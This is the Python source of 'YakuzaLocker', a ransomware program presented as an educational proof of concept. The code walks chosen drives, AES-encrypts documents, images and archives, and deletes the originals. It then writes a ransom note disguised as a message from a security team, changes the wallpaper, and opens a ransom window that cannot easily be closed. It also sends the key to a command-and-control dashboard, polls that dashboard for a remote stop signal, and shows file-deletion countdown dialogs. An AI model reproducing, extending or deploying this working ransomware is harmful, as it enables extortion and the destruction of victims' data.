"""Main file of YakuzaLocker
Main file to Combine all Components of YakuzaLocker together
Author: Yakuza-D
Disclaimer: this app written only and only for educational purpose
"""
import binascii
import logging
import sys
from base64 import b64encode, b64decode
import base64
from ctypes import windll
from datetime import datetime, timedelta
from json import dumps
from os import makedirs, path, remove, walk
# import tkinter as tk
from tkinter import Toplevel, Entry, Label, Button, simpledialog, FLAT, messagebox, Tk, END, Listbox, Frame, BOTH, X, \
    TOP, LEFT, Scrollbar, Text, RIGHT, HORIZONTAL
from tkinter.ttk import Style, Progressbar
from uuid import uuid4
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad
from requests import post, exceptions, get
from time import sleep
from PIL import Image, ImageTk
from threading import Event, Thread

""" Part 1: Application functions """
# Defining Function to load the current path of ransom.py and then join it to relative_path
def resource_path(relative_path):
    # Get Directory name of the current python file
    basePath = getattr(sys, '_MEIPASS', path.dirname(path.abspath(__file__)))

    # join relative_path to directory name of the current python file
    return path.join(basePath, relative_path)


# Create Function to Ensure the time Directory Exist
def ensure_time_dir_exist():
    if not path.exists(TIME_DIR):
        makedirs(TIME_DIR)


# Create Function to Load Machine ID from all drives on the machine
def load_machine_id():
    # Generate a list of all existence drives on the machine
    drives = [f"{x}:\\" for x in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if path.exists(f"{x}:\\")]

    # Iterate through each drive and check if the Machine_id.txt file exists, then read its contents and return it
    for drive in drives:
        machineIdPath = path.join(drive, 'Machine_id.txt')
        if path.exists(machineIdPath):
            try:
                with open(machineIdPath, 'r') as file:
                    machineId = file.read().strip()
                    # debug print
                    print(f"[+] Debug: Machine Id loaded successfully from {machineIdPath}: {machineId}")
                    return machineId
            except FileNotFoundError:
                continue
    # debug print
    print(f"[-] Debug: Can't load machine id's, No valid Machine ID found. ")
    return None


""" Part 2: Define Global constants """
TERMINATION_KEY = "bingo"  # Termination keys used to close app and cancel Deleting Operation
# TERMINATION_KEY = "yakuza"
SECONDARY_TERMINATION_KEY = "stop"
# SECONDARY_TERMINATION_KEY = "davood"

# get the current user's home directory
HOME_DIR = path.expanduser('~')

# Create Path of Time Directory based on the current user's home directory
TIME_DIR = path.join(HOME_DIR, '.cryptolock_time')  # TIME_DIR = os.path.join(HOME_DIR, '.yakuzalock_time')

# Create Path of a timer state file(timer_state.txt) which store in the TIME_DIR
TIMER_STATE_FILE = path.join(TIME_DIR, 'timer_state.txt')

# Path of application icons and images
ICON_PATH = resource_path("img/app_icon.ico")
LOGO_PATH = resource_path("img/logo.png")
THANKS_PATH = resource_path("img/thank_you.png")

""" Part 3: Define Encryption Configs as Global Constants """

# Ensure the time Directory Exists at the Start & Encryption Configs
ensure_time_dir_exist()

# You can customize choose the drives you want to encrypt
DRIVES_TO_ENCRYPT = ["F:", "E:"]

# File Extension to be encrypted, File Extension's can be customized based on a yor target
EXTENSION_TO_ENCRYPT = [".txt", ".jpg", ".png", ".pdf", ".zip", ".rar", ".xlsx", ".docx"]

# Password_PROVIDED used for Encryption Salt to Encryption be stronger
PASSWORD_PROVIDED = "PleaseGiveMeMoney"

# URL of Web Panel(Dashboard) of Ransom Tool
DASHBOARD_URL = "http://localhost/"

# Max Attempt to Enter a decryption key before deleting all encrypted Files
MAX_ATTEMPTS = 10

# Delay between each round of encrypted files Deleting
DELAY = 5

"""  Part 4: Setup Logging to Log the Encryption/Decryption Process in the Log Console """
logging.basicConfig(
    filename="encryption_log.txt",
    level=logging.INFO,
    format="%(asctime)s:%(levelname)s:%(message)s",
    filemode="w"
)

consoleHandler = logging.StreamHandler()
consoleHandler.setLevel(logging.INFO)
formatter = logging.Formatter("%(asctime)s:%(levelname)s:%(message)s")
consoleHandler.setFormatter(formatter)
logging.getLogger().addHandler(consoleHandler)


# Initialize Encryption Tool Class
class EncryptionTool:
    def __init__(self, drives, extensions, password, dashboard_url, max_attempts=10, delay=5):
        self.drives = drives
        self.extensions = extensions
        self.password = password
        self.dashboard_url = dashboard_url
        self.max_attempts = max_attempts
        self.delay = delay
        self.key = self.generate_key(password)  # noqa
        self.machine_id = str(uuid4())

    @staticmethod
    def generate_key(password):
        """ this function generates a key from the password as argument which is PASSWORD_PROVIDED
        :param: password
        :return: key
        """
        try:
            # Create 16 bytes Salt
            salt = get_random_bytes(16)

            # Create PBKDF2 Password with salt in 32 bytes
            key = PBKDF2(password.encode(), salt, dkLen=32, count=1000000)

            # Submit a info log message in Log Console
            logging.info("[+] Encryption: Encryption Key Generated Successfully. ")
            return key

        except Exception as e:
            # Submit a Error log message in Log Console
            logging.error(f"[-] Encryption: Encryption Key Generation Failed: Error {str(e)}")
            raise

    # Create Function to Set Wallpaper on the target machine after ransom running
    @staticmethod
    def set_wallpaper(wallpaper_path):
        try:
            windll.user32.SystemParametersInfoW(20, 0, wallpaper_path, 0)
            logging.info(f"[+] Wallpaper Set Successfully to {wallpaper_path}. ")
        except Exception as e:
            logging.error(f"[-] Failed to set Wallpaper => Error: {str(e)}")

    # Function to Create Important Files on the target machine
    @staticmethod
    def create_important_files(directory_path):
        try:
            # Create a path of D-Data and then Create it if the D-Data directory doesn't exist
            dDataPath = path.join(directory_path, "D-Data")
            makedirs(dDataPath, exist_ok=True)

            # Filenames must be created with fileContents
            filenames = ['Annual_Report_2022.docx', 'Financials_Q3.xlsx', 'Employee_Contacts.pdf']
            fileContents = ['Annual Report Content', 'Financial Data', 'Employee Contact Information']

            # Iterate on all filenames and file contents
            for filename, content in zip(filenames, fileContents):
                # join the filename path to the D-Data Directory path
                filepath = path.join(dDataPath, filename)

                # Create filename(important files) in the D-Data Directory
                with open(filepath, 'w') as file:
                    file.write(content)

            # Submit an Info Log message of Important files created
            logging.info(f"[+] Important Files Created Successfully in {dDataPath}.")
        except Exception as e:
            # Submit Error Log message from exception occurs
            logging.error(f"[-] Failed to create important files => Error: {str(e)}")

    # Create Function to Encrypt a Single File
    def encrypt_file(self, file_path):
        try:
            # Generate a 16-byte IV
            iv = get_random_bytes(16)

            # Create a Cipher object with key+iv on CBC Mode
            cipher = AES.new(self.key, AES.MODE_CBC, iv)

            # Open file_path in Read Binary Mode and then read file contents
            with open(file_path, 'rb') as file:
                fileData = file.read()

            # Encrypt fileData using the Cipher object with AES Algorithm
            encryptedData = cipher.encrypt(pad(fileData, AES.block_size))

            # Write the encryptedData + iv to a new file with .encrypted Extension
            with open(file_path + ".encrypted", 'wb') as file:
                file.write(iv + encryptedData)

            # Remove the Original file from target machine
            remove(file_path)

            # Submit an Info Log from encryption to Log Console
            logging.info(f"[+] Encrypting {file_path} ...")
        except Exception as e:
            # Submit an Error Log from encryption to Log Console
            logging.error(f"[-] Failed to encrypt {file_path} => Error: {str(e)}")

    # Function to Encrypt All Files in a Directory
    def encrypt_files_in_directory(self, directory_path):
        try:
            # Split root(parents) directory, directory and files in directory
            for root, dirs, files in walk(directory_path):

                # If the directory uses fore recycle bin, jump to for loop
                if "$RECYCLE.BIN" in root:
                    continue

                # Iterate on all files in directory, for each file in directory
                for file in files:
                    # if a file ends with each item defined in the extension list, then join filename to the root folder
                    # and then encrypt file using single file encrypt function => encrypt_file()

                    if any(file.endswith(ext) for ext in self.extensions):
                        # join a file to the root directory and then encrypt file using single file encrypt function
                        filePath = path.join(root, file)
                        self.encrypt_file(filePath)

            # Submit Info Log for files encryption in the Log Console
            logging.info(f"[+] All files in the {directory_path} Encrypted Successfully.")
        except Exception as e:
            # Submit Error Log for files encryption in the Log Console
            logging.error(f"[-] Failed to Encrypt files in {directory_path} => Error: {str(e)}")

    # Function to create a user manual
    def create_user_manual(self, directory_path):
        manualContent = f"""Dear User,
Your files have been secured at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} with a unique machine ID: {self.machine_id}
Please keep this machine ID safe. You will need it along with your decryption key to unlock your files.
In case of any issues or to obtain your decryption key, please contact your IT department or your system administrator for further details.
Thank you,
Your Security Team
"""
        manualPath = path.join(directory_path, "READ_ME_FOR_DECRYPTION.txt")
        try:
            with open(manualPath, "w") as file:
                file.write(manualContent)
            logging.info(f"[+] User Manual Created Successfully in {directory_path}.")
        except Exception as e:
            logging.error(f"[-] Failed to create user manual. Error: {str(e)}")

    # Function to send the encryption key to the dashboard
    def send_key_to_dashboard(self):
        encoded_key = b64encode(self.key).decode('utf-8')
        payload = {'machine_id': self.machine_id, 'encryption_key': encoded_key}
        headers = {'Content-Type': 'application/json'}

        for attempt in range(self.max_attempts):
            logging.info(f"Attempt {attempt + 1} to send encryption key.")
            try:
                response = post(self.dashboard_url, headers=headers, data=dumps(payload))
                if response.ok:
                    logging.info('Key sent successfully. Response OK.')
                    return True
                else:
                    logging.error(
                        f'Attempt {attempt + 1} failed. Status Code: {response.status_code}. Response: {response.text}')
            except exceptions.ConnectionError as e:
                logging.error(f"Connection error on attempt {attempt + 1}: {e}")
            if attempt < self.max_attempts - 1:
                sleep(self.delay)
        logging.error("All attempts to send the key failed.")
        return False

    # Function to save the encryption key locally
    def save_key_locally(self):
        # Create Hardcoded Path for saving key
        keyPath = path.join('E:', 'encryption_key.txt')
        try:
            makedirs(path.dirname(keyPath), exist_ok=True)

            # Write Machine id & Encryption key to keyPath file
            with open(keyPath, "w") as file:
                file.write(f"Machine ID: {self.machine_id}\n")
                file.write(f"Encryption Key: {b64encode(self.key).decode('utf-8')}\n")

            # Submit Info Log for the encryption key and the machine id saving
            logging.info(f"[+] Encryption Key Saved Locally in the {keyPath}.")
            return True
        except Exception as e:
            # Submit Error Log for Failed the encryption key and the machine id saving
            logging.error(f"[-] Failed to save the encryption key locally. Error: {str(e)}")
            return False

    # Function to save the machine ID
    def save_machine_id(self, directory_path):
        # Create Hardcoded Path for Machine_id.txt which store the machine id
        machineIdPath = path.join(directory_path, "Machine_id.txt")
        try:
            # Create directory_path if the directory doesn't exist
            makedirs(directory_path, exist_ok=True)

            # Open Machine_id.txt and write 'self.machine_id' to this file
            with open(machineIdPath, "w") as file:
                file.write(self.machine_id)

            # Submit Info Log for saving machine ID
            logging.info(f"[+] Machine ID Saved Successfully in {machineIdPath}.")

        except Exception as e:
            # Submit Error Log for Failed the encryption key and the machine id saving
            logging.error(f"[-] Failed to save the Machine ID locally. Error: {str(e)}")
            return False

    # Function to process a drive (create files, encrypt, etc.)
    def process_drive(self, drive):
        self.create_important_files(drive)
        self.encrypt_files_in_directory(drive)
        self.create_user_manual(drive)
        self.save_machine_id(drive)

    # Final Execution Function on all drives
    def execute(self):
        """Execute the process_drive() on the all Drives,
         and then save the encryption key locally,
         after that set wallpaper on the target machine"""

        # Iterate on all drives and then process_drive()
        for drive in self.drives:
            logging.info(f"[+] Processing Drive: {drive}")
            self.process_drive(drive)

        # Save the encryption key locally
        if self.save_key_locally():
            logging.info("[+] Encryption Key Locally Saved Successfully.")
        else:
            logging.error("[-] Failed to Save the Encryption Key Locally.")

        # create Path of wallpaper & Set wallpaper on the target machine
        wallpaperPath = resource_path("img/wallpaper.png")

        self.set_wallpaper(wallpaperPath)  # noqa
        logging.info("[+] Wallpaper Set Successfully.")
        logging.info("[+] Encryption Process Completed. All files now encrypted.")

""" Part 5: from TerminationKeyDialog() class to DeletionCountdownDialog() class,
Step 17 to Step 27 """
# Define Termination Key Dialog class for user interactions
class TerminationKeyDialog(Toplevel):
    """ in this class, we have a dialog box to get the termination key from the user
    to user can exit from the ransom """

    def __init__(self, parent, icon_path):
        super().__init__(parent)

        # Set Icon, title and geometry
        self.iconbitmap(icon_path)
        self.title("Termination Key")
        self.geometry("300x100")

        # Initialize the result attribute, Termination Key give from Entry save to the result
        self.result = None
        # Label to show this message => Enter the termination key to Exit
        Label(self, text="Enter the termination key to Exit:").pack(pady=5)

        # Entry for user, to give the termination key from user
        self.keyEntry = Entry(self)
        self.keyEntry.pack(pady=5)
        self.keyEntry.focus_set()

        # when click on this, self.result == self.keyEntry.get()
        Button(self, text="Submit", command=self.on_submit).pack(pady=5)

    def on_submit(self):
        self.result = self.keyEntry.get()
        self.destroy()


# Define CustomSecondaryTerminationKeyDialog class for user interactions
class CustomSecondaryTerminationKeyDialog(simpledialog.Dialog):

    """ in this class, we have a dialog box to get the Secondary termination key from the user,
     Secondary Termination key can Prevent Encryption File Deletion if target not paid """

    def __init__(self, parent, icon_path, title, prompt):
        super().__init__(parent, title)
        self.iconPath = icon_path
        self.prompt = prompt

    # Setup Dialog UI
    def body(self, master):
        # Set Icon
        self.iconbitmap(self.iconPath)

        # Create Label with prompt text & Pack it
        Label(master, text=self.prompt).pack(pady=5)

        # Create an Entry widget and pack it
        self.key_entry = Entry(master)
        self.key_entry.pack(pady=5)
        return self.key_entry

    def apply(self):
        self.result = self.key_entry.get()

    # Create Function to Center Position the dialog window
    def center_windows(self):
        """ this function sets the dialog window position in the center of the screen """
        self.update_idletasks()

        # Get current window width and height
        windowWidth = self.winfo_width()
        windowHeight = self.winfo_height()

        # Get Screen width and height
        screenWidth = self.winfo_screenwidth()
        screenHeight = self.winfo_screenheight()

        # Calculate the Position of Screen Center
        positionRight = int(screenWidth/2 - windowWidth/2)
        positionDown = int(screenHeight/2 - windowHeight/2)

        # Set the Position of the window to the center of the screen
        self.geometry(f"+{positionRight}+{positionDown}")


# Define CountdownDialog class for countdown interactions
class CountdownDialog(Toplevel):
    """ in this class, we have a countdown timer to show the user how much time left to enter the decryption key """
    def __init__(self, parent, countdown_time, close_app_callback):
        super().__init__(parent)
        self.countdownTime = countdown_time
        self.close_app_callback = close_app_callback
        self.init_ui()
        self.protocol("WM_DELETE_WINDOW", self.disable_event)
        self.resizable(False, False)
        self.attributes('-topmost', True)
        self.overrideredirect(True)
        self.grab_set()
        self.center_window()

    def disable_event(self):
        pass

    # Function to Setting up countdown dialog UI
    def init_ui(self):
        # Set Position and Icon of Count Down Dialog UI
        self.geometry("350x150")
        self.iconbitmap(ICON_PATH)

        # Open a Thank-You Image and resize it
        thanksImage = Image.open(THANKS_PATH).resize((50, 50))
        thanksPhoto = ImageTk.PhotoImage(thanksImage)

        # Create an image label from thanksPhoto
        # noinspection PyTypeChecker
        label = Label(self, image=thanksPhoto, bg="#f0f0f0")
        label.image = thanksPhoto
        label.pack(side="left", padx=10, pady=20)

        # Set Label on the Count-Down
        self.countdownLabel = Label(self, text=f"Application will close in {self.countdownTime} seconds.", bg='#f0f0f0')
        
        # Packing Personalized Countdown
        self.countdownLabel.pack(side="left", expand=True ,padx=20, pady=20)
        self.update_countdown()

    # Function to Update Count Down Timer
    def update_countdown(self):
        if self.countdownTime > 0:
            self.countdownLabel.config(text=f"Application will close in {self.countdownTime} seconds.")
            self.countdownTime -= 1

            # Repeat CountDownDialog every 1000 ms, until countdownTime reached below 0 and be negative
            self.after(1000, self.update_countdown)
        else:
            self.countdownLabel.config(text="Closing application now...")
            self.close_app_callback()

    # Function to Center Position the countdown timer
    def center_window(self):
        self.update_idletasks()
        # Get current window width and height
        windowWidth = self.winfo_width()
        windowHeight = self.winfo_height()

        # Get current screen width and height
        screenWidth = self.winfo_screenwidth()
        screenHeight = self.winfo_screenheight()

        # Calculate Center Position of Center of Screen
        positionRight = int(screenWidth/2 - windowWidth/2)
        positionDown = int(screenHeight/2 - windowHeight/2)

        # Set count down in the Center of the Screen
        self.geometry(f"+{positionRight}+{positionDown}")


# DeletionCountdownDialog class for deletion countdown interactions
class DeletionCountdownDialog(Toplevel):
    """ in this class,
    we have a countdown timer to show the user how much time left before deleting all encrypted files """
    def __init__(self, parent, stop_deletion_callback):
        super().__init__(parent)
        self.iconbitmap(ICON_PATH)
        self.stop_deletion_callback = stop_deletion_callback
        self.attributes('-topmost', True)
        self.title("Deletion Countdown")
        self.resizable(False, False)

        # below variables only used for clean coding and defining this variable aren't necessary
        self.countdownLabel = None

        # Get window and screen dimensions to calculate the Position of the Screen Center
        windowWidth = 400
        windowHeight = 200
        screenWidth = self.winfo_screenwidth()
        screenHeight = self.winfo_screenheight()
        positionRight = int(screenWidth/2 - windowWidth/2)
        positionDown = int(screenHeight/2 - windowHeight/2)

        # Apply the calculated position to the Countdown box
        self.geometry(f"{windowWidth}x{windowHeight}+{positionRight}+{positionDown}")

        self.protocol("WM_DELETE_WINDOW", self.on_try_close)
        self.grab_set()
        self.focus_set()
        self.init_ui()


    # Create Function to Setting up countdown dialog UI
    def init_ui(self):
        # Open thanks Image and resize it
        thanksImage = Image.open(THANKS_PATH).resize((80, 80))
        thanksPhoto = ImageTk.PhotoImage(thanksImage)

        # Create an image label from thanksPhoto
        # noinspection PyTypeChecker
        labelImage = Label(self, image=thanksPhoto)
        labelImage.photo = thanksPhoto
        labelImage.pack(pady=20)

        # Create a Label for the Count-Down and pack it
        self.countdownLabel = Label(self, text="Next file will be deleted in Every 10 seconds...", font=("Helvetica CE", 12))
        self.countdownLabel.pack()

        # Create a Button to submit Secondary Termination Key
        buttonStop = Button(self, text="Enter Key:", command=self.on_enter_key, font=("Helvetica CE", 10), relief=FLAT)
        buttonStop.pack(pady=10, padx=10, ipadx=20, ipady=5)


    # Function to show warning when target tries to close app
    @staticmethod
    def on_try_close():
        messagebox.showwarning("Warning", "This window cannot be closed directly.")

    # Function to Handle submission of the secondary termination key to stop a deletion process
    def on_enter_key(self):
        self.iconbitmap(ICON_PATH)

        # Show Custom Secondary Termination Key Dialog Box to get Key from target input
        key = CustomSecondaryTerminationKeyDialog(self, icon_path=ICON_PATH, title="Stop Deletion",
                                                  prompt="Enter the secondary termination key:").result

        # Checked if inputted the key same as Secondary Termination Key, then Stop deletion Process
        if key == SECONDARY_TERMINATION_KEY:
            self.stop_deletion_callback()
            self.destroy()
        else:
            messagebox.showerror("Error", "Incorrect secondary termination key.")


""" Part 6: Define DecryptorApp(tk.Tk) class
Step 28 to Step 30"""

class DecryptorApp(Tk):
    """ this is main the main class of decryption process
    actually in this class, we have all tools for decrypting the files as methods and functions """
    def __init__(self):
        super().__init__()
        # Set window title, icon, background and size
        self.iconbitmap(ICON_PATH)
        self.title("YakuzaLocker")
        self.configure(bg='black')
        self.geometry("900x800")

        # below variable used for control the deletion before decryption process
        self.timerUpdateId = None
        self.stopDeletion = False
        self.deletionStopped = False

        # Call initialize_ui() method to initialize Decryptor App UI
        self.initialize_ui()

        # Set Protocol to close windows
        self.protocol("WM_DELETE_WINDOW", self.on_close_window)
        # Create an event to stop the deletion process
        self.stopEvent = Event()

        # Load machine id and check it to load timer after that
        self.machineId = load_machine_id()
        if self.machineId:
            self.load_timer_state()
        else:
            # Show error in message box which say cant load machine id and destroy UI
            messagebox.showerror("Error", "[-] No machine ID found. The application will exit.")
            self.destroy()

        # Start multithread for Checking Self Destroy Remote signal from POC-C&C Dashboard
        Thread(target=self.check_for_remote_stop_signal, args=self.machineId, daemon=True).start()

    # this function stop deletion process when stop_signal arrived from POC-C&C Dashboard
    def check_for_remote_stop_signal(self, machine_id, check_interval=10):
        url = f"http://localhost/yakuzalocker/includes/api/check_stop_signal.php?machine_id={machine_id}"
        while not self.stopDeletion:
            try:
                # Send GET request to POC Dashboard and return response as JSON
                response = get(url, timeout=10)
                response.raise_for_status()
                data = response.json()

                # If stop_signal arrived(stop_signal is 1), stop the deletion process
                if data.get("stop_signal") == "1":
                    self.stop_deletion_process_remotely()
                    break

            except exceptions.RequestException as e:
                pass
            sleep(check_interval)


    #Step 29.1: Function to stop the deletion process remotely
    def stop_deletion_process_remotely(self):
        if not self.stopDeletion:
            self.stopDeletion = True
            self.deletionStopped = True
            self.stopEvent.set()
            self.log("Deletion process stopped by remote command.", 'blue')

            if hasattr(self, 'deletion_dialog') and self.deletion_dialog.winfo_exists():
                self.deletion_dialog.destroy()
                self.deletion_dialog = None # noqa


    # Function to initialize the UI Components
    def initialize_ui(self):
        # Set ICON image of UI
        self.iconbitmap(ICON_PATH)

        # Open logo image and resize it
        logoImage = Image.open(LOGO_PATH).resize((200, 200))
        logoPhoto = ImageTk.PhotoImage(logoImage)

        # Create Frame
        frame = Frame(self, bg='black')
        frame.pack(pady=(20, 20))

        # Create Image label
        # noinspection PyTypeChecker
        logoLabel = Label(frame, image=logoPhoto, bg='black')
        logoLabel.image = logoPhoto
        logoLabel.pack(padx=(0, 20), side=LEFT)

        # Add & Stylish Text, Label for Ransomware Notes
        ransomNotes = """ | PROOF OF CONCEPT: RANSOMWARE SIMULATION | \n\n
| Attention: Your Files Are Encrypted | \n\n
This simulation is solely for educational purposes and must not be used maliciously.
Users are fully accountable for their actions.
Your files have been encrypted using state-of-the-art encryption algorithms. To restore access to your data, you must enter the decryption key. \n\n
=> To Recover Your Files <= \n
Ping Us at [ yakuzaRansom@cryptolock.xyz ]"""

        # Creating text widget for the ransomeNotes
        ransomNoteLabel = Text(frame, bg='black', font=('Helvetica CE', 12), wrap='word', height=16, width=60, borderwidth=0)
        ransomNoteLabel.pack(side=LEFT, padx=(10, 20))

        # Creating the text with suitable tags
        ransomNoteLabel.insert(END, " Proof of Concept: Yakuza Ransomware Simulation \n", "center_green")
        ransomNoteLabel.insert(END, "| Attention: Your Files Are Encrypted | \n\n", "center_green")
        ransomNoteLabel.insert(END, "This simulation is Only & Only for educational purposes and must not "
                                       "be used maliciously. \n", "center_white")
        ransomNoteLabel.insert(END, "Users are fully accountable for their actions. \n\n", "center_white")
        ransomNoteLabel.insert(END, "Your files have been encrypted using state-of-the-art "
                                       "encryption algorithms. To restore access to your data, "
                                       "you must enter the decryption key. \n\n", "center_red")
        ransomNoteLabel.insert(END, " ** To Recover Your Files: ** \n", "center_yellow")
        ransomNoteLabel.insert(END, "Ping Us at => [ ransom@yakuzalock.xyz ]", "center_yellow")

        # Configure the Tags set on the text widget
        ransomNoteLabel.tag_configure("center",justify='center')
        ransomNoteLabel.tag_configure("center_red",justify='center', foreground='red')
        ransomNoteLabel.tag_configure("center_green",justify='center', foreground='green')
        ransomNoteLabel.tag_configure("center_white",justify='center', foreground='white')
        ransomNoteLabel.tag_configure("center_yellow",justify='center', foreground='gold')

        # Apply tags for specif lines
        ransomNoteLabel.tag_add("center", "1.0","1.end")
        ransomNoteLabel.tag_add("center_green", "1.0","2.end")
        ransomNoteLabel.tag_add("center_white", "3.0","5.end")
        ransomNoteLabel.tag_add("center_red", "6.0","6.end")
        ransomNoteLabel.tag_add("center_yellow", "8.0","9.end")

        # Apply Configs and Setups
        ransomNoteLabel.configure(state='disabled')

        self.timerLabel = Label(self, text="", fg='red', bg='black', font=('Helvetica CE', 12))
        self.timerLabel.pack(pady=(10, 10))

        # Call UI Components Functions
        self.setup_key_frame()
        self.setup_log_frame()
        self.setup_progress_frame()


    # Function to stop the deletion process
    def stop_deletion_process(self):
        if not self.stopDeletion:
            self.stopDeletion = True
            self.deletionStopped = True
            self.stopEvent.set()
            self.log("Deletion process stopped by secondary termination key.", 'white')

            if hasattr(self, 'deletion_dialog') and self.deletion_dialog.winfo_exists():
                self.deletion_dialog.destroy()

    # Function to check the secondary termination key
    def check_secondary_termination(self):
        # Give secondary key from user
        response = simpledialog.askstring("Stop Deletion", "Enter the secondary termination key:", parent=self)

        # if secondary key is correct then stop the deletion process
        if response == SECONDARY_TERMINATION_KEY:
            self.stop_deletion_process()
        else:
            messagebox.showerror("Error", "Incorrect secondary termination key.")


    # Function to submit log messages
    def log(self, message, color='green'):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        formattedMessage = f"[{timestamp}] {message}"
        if self.winfo_exists():
            self.after(0, lambda: self._update_log_listbox(formattedMessage, color))

    # Function to update the log listbox
    def _update_log_listbox(self, message, color):
        self.logListbox.insert(END, message)
        self.logListbox.itemconfig(END, {'fg': color})
        self.logListbox.see(END)

    # Function to setting up the log frame
    def setup_log_frame(self):
        # Create a frame for the log and pack it
        logFrame = Frame(self, bg='black')
        logFrame.pack(fill=BOTH, expand=True, padx=10, pady=10)

        # Create a label for the banner
        bannerText = "Welcome to YakuzaLocker - [HACKER MODE]"
        bannerLabel = Label(logFrame, text=bannerText, fg='orange', bg='black', font=('Courier New', 12))
        bannerLabel.pack(side=TOP, fill=X)

        # Create a List box for the logs
        self.logListbox = Listbox(logFrame, width=50, height=6, bg='black', fg='#00FF00', font=('Courier New', 10))
        self.logListbox.pack(side=LEFT, fill=BOTH, expand=True)

        # Create a scrollbar for the log listbox and append it to the logListbox
        scrollbar = Scrollbar(logFrame, orient="vertical", command=self.logListbox.yview)
        scrollbar.pack(side="right", fill="y")
        self.logListbox.config(yscrollcommand=scrollbar.set)

    # Function to setting up the key frame
    def setup_key_frame(self):
        # Create a frame for the key and pack it
        keyFrame = Frame(self, bg='black')
        keyFrame.pack(fill=X, padx=10, pady=(10, 5))

        # Create Entry and pack it for give key from user
        self.keyEntry = Entry(keyFrame, fg='black', font=('Helvetica CE', 12), bd=1, relief=FLAT)
        self.keyEntry.pack(fill=X, side=LEFT, expand=True, padx=(10, 0), ipady=8)

        # Create Button to execute start_decryption() function
        Button(keyFrame, text="START DECRYPTION", bg='#d9534f', fg='white', font=('Helvetica CE', 12), relief=FLAT,
               command=self.start_decryption).pack(side=RIGHT, padx=(10, 0))

    # Function to Setting UP the progress frame
    def setup_progress_frame(self):
        # Create Progress frame
        self.progressFrame = Frame(self, bg='black')
        self.progressFrame.pack(fill=X, padx=10, pady=20)

        # Create Style, Set Theme and Configure Progressbar
        style = Style()
        style.theme_use('clam')
        style.configure("Enhanced.Horizontal.TProgressbar", troughcolor='black', background='green', thickness=20)

        # Create Progressbar and pack it
        self.progress = Progressbar(self.progressFrame, style="Enhanced.Horizontal.TProgressbar",
                                    orient=HORIZONTAL, length=400, mode='determinate')
        self.progress.pack(fill=X, expand=True)

        # Create label for Progressbar
        self.progressLabel = Label(self.progressFrame, text="Decryption Progress: 0%", fg='white', bg='black')
        self.progressLabel.pack()

    """ Part 8: Decryption Process Methods
    Step 38 to Step 43 """

    # Function to start the decryption process
    def start_decryption(self):
        # Get a Decryption key from Entry
        decryptionKey = self.keyEntry.get()
        if decryptionKey:
            try:
                # Base64 decode decryption key
                key = b64decode(decryptionKey)
                self.log("Starting scan and decryption automatically.")

                # Reset timer Update ID
                if self.timerUpdateId:
                    self.after_cancel(self.timerUpdateId)
                    self.timerUpdateId = None

                # Run scan_and_decrypt() on multithreading mode to Find and Decrypt all encrypted files
                Thread(target=self.scan_and_decrypt, args=(key,), daemon=True).start()

            except binascii.Error:
                messagebox.showerror("Error", "[-] Invalid decryption key. Please check the key and try again.")
        else:
            messagebox.showerror("Error", "[-] Decryption key is not provided.")

    # Function to scan and decrypt files
    def scan_and_decrypt(self, key):
        encryptedFiles = []

        # List generator with existed drives in the machine
        drives = [f"{x}:\\" for x in "DEFGHIJKLMNOPQRSTUVWXYZ" if path.exists(f"{x}:\\")]

        # Iterate over each drive
        for drive in drives:
            self.log(f"Scanning drive {drive} for encrypted files.")

            # Iterate on the all directories and files in the drive
            for dp, dn, filenames in walk(drive):
                # if directory path is special os directories jump to loop begin
                if any(exclude in dp for exclude in {'System Volume Information', '$RECYCLE.BIN', 'Windows'}):
                    continue

                # Iterate on the all files in the directory
                for f in filenames:
                    # if the file is encrypted, then append it to an encrypted_files list
                    if f.endswith('.encrypted'):
                        encryptedFiles.append(path.join(dp, f))
                        self.log(f"Found encrypted file: {path.join(dp, f)}")

        # Calculate pre requires data for decryption process
        totalFiles = len(encryptedFiles)
        self.safe_update_progress(0, totalFiles)
        decryptedCount = 0

        # iterate on the all .encrypted files in the encrypted_files list
        for filePath in encryptedFiles:
            # Decrypt file with key and update decryption progress
            if self.decrypt_file(filePath, key):
                # Decrypt file with key and update decryption progress
                decryptedCount += 1
                self.safe_update_progress(decryptedCount, totalFiles)

        # if all files decrypted successfully, then stop_timer_and_show_success dialog box
        if decryptedCount == totalFiles:
            self.after(0, self.stop_timer_and_show_success)

        #else, all files decrypted a Failed, show error message in a messagebox
        else:
            self.after(0, lambda: messagebox.showerror('Decryption Failed',
                                                       '[-] Failed to decrypt one or more files. Please check the decryption key and try again.'))

    # Function to Show Incomplete Decryption Message Dialog
    @staticmethod
    def show_incomplete_message(self, decrypted_count, total_files):
        messagebox.showwarning("Decryption Incomplete",
                               f"Decryption completed for {decrypted_count} out of {total_files} files.")

    # Function to safely update the progress bar
    def safe_update_progress(self, value, maximum):
        self.after(0, lambda: self.update_progress_bar(value, maximum))

    # Function to update the progress bar
    def update_progress_bar(self, value, maximum):
        self.progress["value"] = value
        self.progress["maximum"] = maximum
        percentage = 100 * (value/maximum) if maximum else 0
        self.progressLabel.config(text=f"Decryption Progress: {percentage:.2f}%")

    # Function to Stop Timer and Show Success Message
    def stop_timer_and_show_success(self):
        if self.timerUpdateId:
            # Set timer on the 0(None)
            self.after_cancel(self.timerUpdateId)
            self.timerUpdateId = None

            # Show the success message
            successMessage = "All files decrypted successfully. Thank you for your patience."
            messagebox.showinfo("Decryption Complete", successMessage)

            # Delete timer and machine id files
            self.delete_timer_and_machine_id_files()
            self.delete_timer_state_file()
            countdownDialog = CountdownDialog(self, 10, self.close_application)
            countdownDialog.mainloop()


    """ Part 9: Implement Timer and Cleanup Methods 
    from Step 44 to Step 56 """

    # Step 44: Function to start closing countdown
    def start_closing_countdown(self):
        countdownDialog = CountdownDialog(self, 15, self.close_application)
        countdownDialog.grab_set()
        countdownDialog.mainloop()

    # Step 45: Function to close the application
    def close_application(self):
        try:
            self.destroy()
        except Exception as e:
            print(f"Exception Happened when closing YakuzaLocker. \nError: {e}")

    # Step 46: Function to handle window close event
    def on_close_window(self):
        # Create Termination Key Dialog to give TERMINATION_KEY from user
        dialog = TerminationKeyDialog(self, ICON_PATH)
        self.wait_window(dialog)

        # if user submit TERMINATION_KEY correct, then close(destroy) app
        if dialog.result == TERMINATION_KEY:
            self.destroy()
        else:
            messagebox.showerror("Error", "Incorrect termination key.")
            return

